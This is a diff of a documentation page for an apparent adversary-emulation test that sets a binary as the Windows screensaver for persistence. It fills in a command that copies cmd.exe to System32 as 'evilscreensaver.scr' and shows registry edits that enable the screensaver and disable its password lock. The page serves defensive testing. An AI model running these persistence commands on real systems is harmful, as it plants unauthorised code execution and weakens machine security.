@@ -756,10 +756,11 @@
 <div class="section" id="atomic-test-1-set-arbitrary-binary-as-screensaver">
 <h3>Atomic Test #1 - Set Arbitrary Binary as Screensaver<a class="headerlink" href="#atomic-test-1-set-arbitrary-binary-as-screensaver" title="Permalink to this headline">¶</a></h3>
 <p>This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>copy #{input_binary} &quot;%SystemRoot%\System32\evilscreensaver.scr&quot;
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>copy C:\Windows\System32\cmd.exe &quot;%SystemRoot%\System32\evilscreensaver.scr&quot;
 reg.exe add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive /t REG_SZ /d 1 /f
 reg.exe add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveTimeout /t REG_SZ /d 60 /f
 reg.exe add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
